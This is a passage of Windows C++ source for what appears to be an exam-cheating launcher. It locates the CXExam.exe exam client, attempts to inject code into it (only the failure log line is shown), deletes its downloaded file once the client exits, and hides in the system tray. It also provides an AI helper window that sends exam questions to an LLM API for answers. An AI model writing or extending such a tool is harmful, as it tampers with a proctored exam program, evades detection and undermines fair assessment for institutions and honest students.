                    DebugPrintFormat(L"[Inject] Remote load failed: %ls", emsg);
                    SetWindowTextW(GetDlgItem(hWnd, IDC_STATIC_STATUS), L"状态：已启动，但注入失败");
                }
            }

            HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param)->DWORD {
                HWND hwndMain = (HWND)param;
                if (g_processHandle)
                {
                    WaitForSingleObject(g_processHandle, INFINITE);
                    CloseHandle(g_processHandle);
                    g_processHandle = nullptr;
                }
                if (lstrlenW(g_downloadedFile) > 0)
                {
                    DeleteFileW(g_downloadedFile);
                    DebugPrintFormat(L"[Cleanup] Deleted %s", g_downloadedFile);
                    g_downloadedFile[0] = L'\0';
                }
                PostMessageW(hwndMain, WM_APP + 1, 0, 0);
                return 0;
            }, hWnd, 0, nullptr);
            if (hThread) CloseHandle(hThread);

            if (g_autoHide)
            {
                HideWindowToTray(hWnd);
            }
            else
            {
                SetForegroundWindow(hWnd);
            }
        }
        break;
            // 已移除选择文件夹逻辑
            case IDC_BTN_AUTO_FIND:
                {
                    SetStatus(hWnd, L"状态：正在自动查找各磁盘，请耐心等待...");
                    HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param)->DWORD {
                        HWND hwndMain = (HWND)param;
                        WCHAR found[MAX_PATH] = L"";
                        // 优先常见目录
                        WCHAR pf[MAX_PATH] = L"";
                        if (SHGetSpecialFolderPathW(nullptr, pf, CSIDL_PROGRAM_FILES, FALSE))
                        {
                            if (FindCxInFolderRecursive(pf, found)) goto done;
                        }
                        if (SHGetSpecialFolderPathW(nullptr, pf, CSIDL_PROGRAM_FILESX86, FALSE))
                        {
                            if (FindCxInFolderRecursive(pf, found)) goto done;
                        }
                        if (SHGetSpecialFolderPathW(nullptr, pf, CSIDL_COMMON_APPDATA, FALSE))
                        {
                            if (FindCxInFolderRecursive(pf, found)) goto done;
                        }
                        // 遍历固定磁盘
                        for (WCHAR drive = L'C'; drive <= L'Z'; ++drive)
                        {
                            WCHAR root[4] = { drive, L':', L'\\', L'\0' };
                            if (GetDriveTypeW(root) == DRIVE_FIXED)
                            {
                                if (FindCxInFolderRecursive(root, found)) goto done;
                            }
                        }
                    done:
                        if (found[0])
                        {
                            PostMessageW(hwndMain, WM_APP + 2, 0, (LPARAM)_wcsdup(found));
                        }
                        else
                        {
                            PostMessageW(hwndMain, WM_APP + 3, 0, 0);
                        }
                        return 0;
                    }, hWnd, 0, nullptr);
                    if (hThread) CloseHandle(hThread);
                }
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_APP + 1:
        // 目标程序退出并清理完成后，直接退出本程序
        PostQuitMessage(0);
        break;
    case WM_APP + 2: // 找到路径
        if (lParam)
        {
            ApplyFoundPath(hWnd, (const WCHAR*)lParam);
            free((void*)lParam);
        }
        break;
    case WM_APP + 3: // 未找到
        SetStatus(hWnd, L"状态：未找到 CXExam.exe，请手动选择或更换目录。");
        break;
    case WM_TRAYICON:
        if (lParam == WM_LBUTTONDBLCLK || lParam == WM_LBUTTONUP)
        {
            RestoreWindowFromTray(hWnd);
        }
        else if (lParam == WM_RBUTTONUP)
        {
            ShowTrayMenu(hWnd);
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_SIZE:
        RepositionFooter(hWnd);
        RepositionImageAndText(hWnd);
        break;
    case WM_DESTROY:
        if (g_hUIFont && g_hUIFont != (HFONT)GetStockObject(DEFAULT_GUI_FONT))
        {
            DeleteObject(g_hUIFont);
            g_hUIFont = nullptr;
        }
        RemoveTrayIcon();
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

LRESULT CALLBACK AiConfigWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        {
            CreateWindowW(L"STATIC", L"API地址:", WS_CHILD | WS_VISIBLE,
                8, 12, 100, 20, hWnd, (HMENU)IDC_STATIC_AI_ENDPOINT, hInst, nullptr);
            CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", g_aiConfig.endpoint,
                WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                110, 10, 370, 24, hWnd, (HMENU)IDC_EDIT_AI_ENDPOINT, hInst, nullptr);

            CreateWindowW(L"STATIC", L"API Key:", WS_CHILD | WS_VISIBLE,
                8, 42, 100, 20, hWnd, (HMENU)IDC_STATIC_AI_KEY, hInst, nullptr);
            CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", g_aiConfig.apiKey,
                WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_PASSWORD,
                110, 40, 370, 24, hWnd, (HMENU)IDC_EDIT_AI_KEY, hInst, nullptr);

            CreateWindowW(L"STATIC", L"模型:", WS_CHILD | WS_VISIBLE,
                8, 72, 100, 20, hWnd, (HMENU)IDC_STATIC_AI_MODEL, hInst, nullptr);
            CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", g_aiConfig.model,
                WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                110, 70, 370, 24, hWnd, (HMENU)IDC_EDIT_AI_MODEL, hInst, nullptr);

            CreateWindowW(L"BUTTON", L"保存配置", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                110, 110, 100, 30, hWnd, (HMENU)IDC_BTN_AI_SAVE, hInst, nullptr);

            CreateWindowW(L"BUTTON", L"测试连接", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                220, 110, 100, 30, hWnd, (HMENU)IDC_BTN_AI_TEST, hInst, nullptr);

            CreateWindowW(L"STATIC",
                L"使用说明：\n"
                L"1. 支持OpenAI及兼容接口(如DeepSeek、Kimi等)\n"
                L"2. API Key用于身份验证，请妥善保管\n"
                L"3. 常用模型：gpt-3.5-turbo、gpt-4、deepseek-chat等\n"
                L"4. 配置保存在程序目录的ai_config.ini文件中",
                WS_CHILD | WS_VISIBLE | SS_LEFT,
                8, 150, 474, 80, hWnd, nullptr, hInst, nullptr);

            ApplyUIFont(hWnd);
        }
        break;
    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
        case IDC_BTN_AI_SAVE:
            {
                GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_ENDPOINT), g_aiConfig.endpoint, 512);
                GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_KEY), g_aiConfig.apiKey, 512);
                GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_MODEL), g_aiConfig.model, 128);
                SaveAiConfig();
                MessageBoxW(hWnd, L"配置已保存！", L"成功", MB_OK | MB_ICONINFORMATION);
            }
            break;
        case IDC_BTN_AI_TEST:
            {
                GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_ENDPOINT), g_aiConfig.endpoint, 512);
                GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_KEY), g_aiConfig.apiKey, 512);
                GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_MODEL), g_aiConfig.model, 128);
                SaveAiConfig();

                HWND hBtn = GetDlgItem(hWnd, IDC_BTN_AI_TEST);
                if (hBtn)
                {
                    EnableWindow(hBtn, FALSE);
                    SetWindowTextW(hBtn, L"测试中...");
                }

                struct AiTestContext { HWND hwnd; };
                AiTestContext* ctx = new AiTestContext{ hWnd };
                HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param)->DWORD {
                    AiTestContext* ctxInner = static_cast<AiTestContext*>(param);
                    std::wstring response = CallAiApi(L"请回复“OK”以确认接口可用。");
                    AiResponsePayload* payload = new AiResponsePayload{ true, response };
                    if (!PostMessageW(ctxInner->hwnd, WM_AI_RESPONSE, 2, (LPARAM)payload))
                    {
                        delete payload;
                    }
                    delete ctxInner;
                    return 0;
                }, ctx, 0, nullptr);

                if (!hThread)
                {
                    delete ctx;
                    if (hBtn)
                    {
                        EnableWindow(hBtn, TRUE);
                        SetWindowTextW(hBtn, L"测试连接");
                    }
                    MessageBoxW(hWnd, L"无法创建测试线程。", L"错误", MB_OK | MB_ICONERROR);
                }
                else
                {
                    CloseHandle(hThread);
                }
            }
            break;
        }
        break;
    case WM_AI_RESPONSE:
        if (wParam == 2)
        {
            AiResponsePayload* payload = reinterpret_cast<AiResponsePayload*>(lParam);
            if (payload)
            {
                MessageBoxW(hWnd, payload->message.c_str(), L"测试结果", MB_OK | MB_ICONINFORMATION);
                delete payload;
            }
            HWND hBtn = GetDlgItem(hWnd, IDC_BTN_AI_TEST);
            if (hBtn)
            {
                EnableWindow(hBtn, TRUE);
                SetWindowTextW(hBtn, L"测试连接");
            }
        }
        break;
    case WM_CLOSE:
        DestroyWindow(hWnd);
        break;
    case WM_DESTROY:
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

struct AiHelperContext
{
    bool busy;
};

LRESULT CALLBACK AiHelperWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    AiHelperContext* ctx = reinterpret_cast<AiHelperContext*>(GetWindowLongPtrW(hWnd, GWLP_USERDATA));

    switch (message)
    {
    case WM_CREATE:
        {
            ctx = new AiHelperContext();
            ctx->busy = false;
            SetWindowLongPtrW(hWnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(ctx));

            CreateWindowW(L"STATIC", L"输入题目:", WS_CHILD | WS_VISIBLE,
                8, 12, 80, 20, hWnd, nullptr, hInst, nullptr);

            CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL,
                8, 32, 570, 150, hWnd, (HMENU)IDC_EDIT_AI_QUESTION, hInst, nullptr);

            CreateWindowW(L"BUTTON", L"AI解答 (F5)", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                8, 190, 140, 30, hWnd, (HMENU)IDC_BTN_AI_ASK, hInst, nullptr);

            CreateWindowW(L"STATIC", L"AI答案:", WS_CHILD | WS_VISIBLE,
                8, 232, 80, 20, hWnd, nullptr, hInst, nullptr);

            CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL,
                8, 252, 570, 190, hWnd, (HMENU)IDC_EDIT_AI_ANSWER, hInst, nullptr);

            ApplyUIFont(hWnd);
        }
        break;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_BTN_AI_ASK)
        {
            if (ctx && ctx->busy)
            {
                break;
            }

            WCHAR question[4096] = L"";
            GetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_AI_QUESTION), question, 4096);
            if (wcslen(question) == 0)
            {
                MessageBoxW(hWnd, L"请先输入题目内容。", L"提示", MB_OK | MB_ICONWARNING);
                break;
            }

            HWND hAnswer = GetDlgItem(hWnd, IDC_EDIT_AI_ANSWER);
            if (hAnswer)
            {
                SetWindowTextW(hAnswer, L"正在与AI接口通讯，请稍候...");
            }
            HWND hBtnAsk = GetDlgItem(hWnd, IDC_BTN_AI_ASK);
            if (hBtnAsk)
            {
                EnableWindow(hBtnAsk, FALSE);
            }
            if (ctx)
            {
                ctx->busy = true;
            }

            struct AiHelperRequest
            {
                HWND hwnd;
                std::wstring prompt;
            };

            AiHelperRequest* req = new AiHelperRequest{ hWnd, std::wstring(question) };
            HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param)->DWORD {
                AiHelperRequest* request = static_cast<AiHelperRequest*>(param);
                HWND targetWnd = request->hwnd;
                std::wstring prompt = request->prompt;
                delete request;

                std::wstring fullPrompt = L"你是一个专业的答题助手，请结合题意给出详细的分析步骤和最终答案。\n\n题目：\n" + prompt;
                std::wstring result = CallAiApi(fullPrompt);

                AiResponsePayload* payload = new AiResponsePayload{ true, result };
                if (!PostMessageW(targetWnd, WM_AI_RESPONSE, 1, (LPARAM)payload))
                {
                    delete payload;
                }
                return 0;
            }, req, 0, nullptr);

            if (!hThread)
            {
                delete req;
                if (ctx)
                {
                    ctx->busy = false;
                }
                if (hBtnAsk)
                {
                    EnableWindow(hBtnAsk, TRUE);
                }
                MessageBoxW(hWnd, L"无法创建AI请求线程。", L"错误", MB_OK | MB_ICONERROR);
            }
            else
            {
                CloseHandle(hThread);
            }
        }
        break;
    case WM_AI_RESPONSE:
        if (wParam == 1)
        {
            AiResponsePayload* payload = reinterpret_cast<AiResponsePayload*>(lParam);
            if (payload)
            {
                HWND hAnswer = GetDlgItem(hWnd, IDC_EDIT_AI_ANSWER);
                if (hAnswer)
                {
                    SetWindowTextW(hAnswer, payload->message.c_str());
                }
                delete payload;
            }
            HWND hBtnAsk = GetDlgItem(hWnd, IDC_BTN_AI_ASK);
            if (hBtnAsk)
            {
                EnableWindow(hBtnAsk, TRUE);
            }
            if (ctx)
            {
                ctx->busy = false;
            }
        }
        break;
    case WM_SIZE:
        {
            RECT rc;
            GetClientRect(hWnd, &rc);
            int width = rc.right - 16;
            int heightQuestion = 150;
            int heightAnswer = rc.bottom - 270;
            if (width < 200) width = 200;
            if (heightAnswer < 80) heightAnswer = 80;

            MoveWindow(GetDlgItem(hWnd, IDC_EDIT_AI_QUESTION), 8, 32, width, heightQuestion, TRUE);
            MoveWindow(GetDlgItem(hWnd, IDC_EDIT_AI_ANSWER), 8, 252, width, heightAnswer, TRUE);
        }
        break;
    case WM_KEYDOWN:
        if (wParam == VK_F5)
        {
            SendMessageW(hWnd, WM_COMMAND, MAKELONG(IDC_BTN_AI_ASK, BN_CLICKED), 0);
        }
        break;
    case WM_DESTROY:
        if (ctx)
        {
            delete ctx;
            SetWindowLongPtrW(hWnd, GWLP_USERDATA, 0);
        }
        g_aiWindow = nullptr;
        break;
    case WM_CLOSE:
        DestroyWindow(hWnd);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
